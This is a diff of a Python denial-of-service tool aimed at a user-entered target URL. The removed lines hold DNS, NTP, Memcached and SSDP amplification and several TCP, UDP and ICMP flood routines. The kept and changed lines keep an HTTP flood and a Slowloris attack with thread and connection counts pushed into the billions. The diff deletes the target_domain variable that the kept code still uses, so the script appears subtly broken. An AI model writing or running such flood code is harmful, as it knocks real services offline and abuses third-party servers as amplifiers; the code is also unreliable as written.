@@ -4,27 +4,11 @@ import random
 import string
 import time
 import threading
-from scapy.all import IP, UDP, DNS, send, ICMP, Raw, TCP
-from scapy.layers.inet import IP, UDP, TCP
-from scapy.layers.dns import DNS, DNSQR
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
 
 # Configuration
 target_url = input("Enter the target URL (e.g., https://www.example.com): ")
-target_domain = target_url.replace('https://', '').replace('http://', '').split('/')[0]
-dns_servers = [
-    '8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222', '208.67.220.220', '8.8.4.4', '1.0.0.1', '9.9.9.10', '208.67.222.220', '208.67.220.222'
-]
-ntp_servers = [
-    '0.pool.ntp.org', '1.pool.ntp.org', '2.pool.ntp.org', '3.pool.ntp.org'
-]
-memcached_servers = [
-    '127.0.0.1:11211', '127.0.0.1:11212', '127.0.0.1:11213', '127.0.0.1:11214'
-]
-ssdp_servers = [
-    '239.255.255.250:1900'
-]
 user_agents = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
@@ -39,7 +23,7 @@ headers = [
     "Upgrade-Insecure-Requests: 1"
 ]
 
-# HTTP Flood without Proxy Rotation and Behavioral Mimicry
+# HTTP Flood with Random User Agents and Headers
 def http_flood():
     session = requests.Session()
     retry = Retry(connect=3, backoff_factor=0.5)
@@ -57,48 +41,10 @@ def http_flood():
             print(f'Error: {e}')
         time.sleep(random.uniform(0.00000001, 0.00000002))  # Minimal sleep interval
 
-# DNS Amplification
-def dns_amplification():
-    while True:
-        dns_server = random.choice(dns_servers)
-        query = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '.' + target_domain
-        packet = IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query, qtype='A'))
-        send(packet, verbose=0)
-        time.sleep(random.uniform(0.00000001, 0.00000002))  # Minimal sleep interval
-
-# NTP Amplification
-def ntp_amplification():
-    while True:
-        ntp_server = random.choice(ntp_servers)
-        packet = IP(dst=ntp_server) / UDP(dport=123) / Raw(load=b'\x17\x00\x03\x2a' + b'\x00' * 40)
-        send(packet, verbose=0)
-        time.sleep(random.uniform(0.00000001, 0.00000002))  # Minimal sleep interval
-
-# Memcached Amplification
-def memcached_amplification():
-    while True:
-        memcached_server = random.choice(memcached_servers)
-        packet = b'\x00\x00\x00\x00\x00\x01\x00\x00' + target_domain.encode() + b'\x00'
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(memcached_server)
-        s.sendall(packet)
-        s.close()
-        time.sleep(random.uniform(0.00000001, 0.00000002))  # Minimal sleep interval
-
-# SSDP Amplification
-def ssdp_amplification():
-    while True:
-        ssdp_server = random.choice(ssdp_servers)
-        packet = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n'
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(packet, ssdp_server)
-        s.close()
-        time.sleep(random.uniform(0.00000001, 0.00000002))  # Minimal sleep interval
-
 # Slowloris Attack
 def slowloris():
     sockets = []
-    for _ in range(100000):  # Extremely increased number of connections
+    for _ in range(10000000000):  # Extremely increased number of connections
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target_domain, 80))
         s.send(b"GET / HTTP/1.1\r\nHost: " + target_domain.encode() + b"\r\n")
@@ -123,143 +69,11 @@ def slowloris():
                 sockets.append(s)
         time.sleep(0.001)  # Minimal sleep time for maximum intensity
 
-# SYN Flood Attack
-def syn_flood():
-    target_ip = socket.gethostbyname(target_domain)
-    port = 80
-    while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target_ip, port))
-        s.send(b"GET / HTTP/1.1\r\nHost: " + target_domain.encode() + b"\r\n\r\n")
-        s.close()
-        time.sleep(random.uniform(0.00000001, 0.00000002))  # Minimal sleep interval
-
-# UDP Flood Attack
-def udp_flood():
-    target_ip = socket.gethostbyname(target_domain)
-    while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(b'\x00' * 1024, (target_ip, random.randint(1, 65535)))
-        time.sleep(random.uniform(0.00000001, 0.00000002))  # Minimal sleep interval
-
-# ICMP Flood Attack
-def icmp_flood():
-    target_ip = socket.gethostbyname(target_domain)
-    while True:
-        packet = IP(dst=target_ip) / ICMP()
-        send(packet, verbose=0)
-        time.sleep(random.uniform(0.00000001, 0.00000002))  # Minimal sleep interval
-
-# ACK Flood Attack
-def ack_flood():
-    target_ip = socket.gethostbyname(target_domain)
-    port = 80
-    while True:
-        packet = IP(dst=target_ip) / TCP(dport=port, flags="A", seq=random.randint(0, 0xFFFFFFFF), ack=random.randint(0, 0xFFFFFFFF))
-        send(packet, verbose=0)
-        time.sleep(random.uniform(0.00000001, 0.00000002))  # Minimal sleep interval
-
-# RST Flood Attack
-def rst_flood():
-    target_ip = socket.gethostbyname(target_domain)
-    port = 80
-    while True:
-        packet = IP(dst=target_ip) / TCP(dport=port, flags="R", seq=random.randint(0, 0xFFFFFFFF))
-        send(packet, verbose=0)
-        time.sleep(random.uniform(0.00000001, 0.00000002))  # Minimal sleep interval
-
-# FIN Flood Attack
-def fin_flood():
-    target_ip = socket.gethostbyname(target_domain)
-    port = 80
-    while True:
-        packet = IP(dst=target_ip) / TCP(dport=port, flags="F", seq=random.randint(0, 0xFFFFFFFF))
-        send(packet, verbose=0)
-        time.sleep(random.uniform(0.00000001, 0.00000002))  # Minimal sleep interval
-
-# Xmas Flood Attack
-def xmas_flood():
-    target_ip = socket.gethostbyname(target_domain)
-    port = 80
-    while True:
-        packet = IP(dst=target_ip) / TCP(dport=port, flags="FPU", seq=random.randint(0, 0xFFFFFFFF))
-        send(packet, verbose=0)
-        time.sleep(random.uniform(0.00000001, 0.00000002))  # Minimal sleep interval
-
-# Null Flood Attack
-def null_flood():
-    target_ip = socket.gethostbyname(target_domain)
-    port = 80
-    while True:
-        packet = IP(dst=target_ip) / TCP(dport=port, flags="", seq=random.randint(0, 0xFFFFFFFF))
-        send(packet, verbose=0)
-        time.sleep(random.uniform(0.00000001, 0.00000002))  # Minimal sleep interval
-
 # Main function to start all attacks in separate threads
 def main():
     threads = []
-    for _ in range(50000):  # Extremely increased number of threads for HTTP flood
+    for _ in range(5000000000):  # Extremely increased number of threads for HTTP flood
         thread = threading.Thread(target=http_flood)
-        threads.append(thread)
-        thread.start()
-
-    for _ in range(25000):  # Extremely increased number of threads for DNS amplification
-        thread = threading.Thread(target=dns_amplification)
-        threads.append(thread)
-        thread.start()
-
-    for _ in range(12500):  # Extremely increased number of threads for NTP amplification
-        thread = threading.Thread(target=ntp_amplification)
-        threads.append(thread)
-        thread.start()
-
-    for _ in range(12500):  # Extremely increased number of threads for Memcached amplification
-        thread = threading.Thread(target=memcached_amplification)
-        threads.append(thread)
-        thread.start()
-
-    for _ in range(12500):  # Extremely increased number of threads for SSDP amplification
-        thread = threading.Thread(target=ssdp_amplification)
-        threads.append(thread)
-        thread.start()
-
-    for _ in range(7500):  # Extremely increased number of threads for SYN flood
-        thread = threading.Thread(target=syn_flood)
-        threads.append(thread)
-        thread.start()
-
-    for _ in range(8000):  # Extremely increased number of threads for UDP flood
-        thread = threading.Thread(target=udp_flood)
-        threads.append(thread)
-        thread.start()
-
-    for _ in range(5000):  # Extremely increased number of threads for ICMP flood
-        thread = threading.Thread(target=icmp_flood)
-        threads.append(thread)
-        thread.start()
-
-    for _ in range(5000):  # Extremely increased number of threads for ACK flood
-        thread = threading.Thread(target=ack_flood)
-        threads.append(thread)
-        thread.start()
-
-    for _ in range(5000):  # Extremely increased number of threads for RST flood
-        thread = threading.Thread(target=rst_flood)
-        threads.append(thread)
-        thread.start()
-
-    for _ in range(5000):  # Extremely increased number of threads for FIN flood
-        thread = threading.Thread(target=fin_flood)
-        threads.append(thread)
-        thread.start()
-
-    for _ in range(5000):  # Extremely increased number of threads for Xmas flood
-        thread = threading.Thread(target=xmas_flood)
-        threads.append(thread)
-        thread.start()
-
-    for _ in range(5000):  # Extremely increased number of threads for Null flood
-        thread = threading.Thread(target=null_flood)
         threads.append(thread)
         thread.start()
 
